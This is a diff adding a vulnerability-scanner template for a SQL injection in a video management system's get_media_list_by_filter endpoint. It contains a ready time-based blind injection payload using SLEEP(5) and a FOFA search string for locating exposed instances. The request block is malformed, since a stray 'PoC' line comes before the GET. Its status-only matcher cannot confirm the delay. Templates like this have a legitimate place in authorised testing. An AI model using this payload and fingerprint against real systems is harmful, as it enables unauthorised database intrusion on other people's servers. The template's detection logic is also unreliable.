@@ -1,0 +1,21 @@
+id: poc-xef34452g15w0h0u
+info:
+  name: 妖气山视频管理系统  get_media_list_by_filter存在 SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xef34452g15w0h0u'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xef34452g15w0h0u
+    fofa: body="yaoqishan-header"
+http:
+- raw:
+  - 'PoC
+
+    GET /api/get_media_list_by_filter.json?typeId=1%27+AND+%28SELECT+6178+FROM+%28SELECT%28SLEEP%285%29%29%29FJXn%29+AND+%27WDUU%27%3D%27WDUU HTTP/1.1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
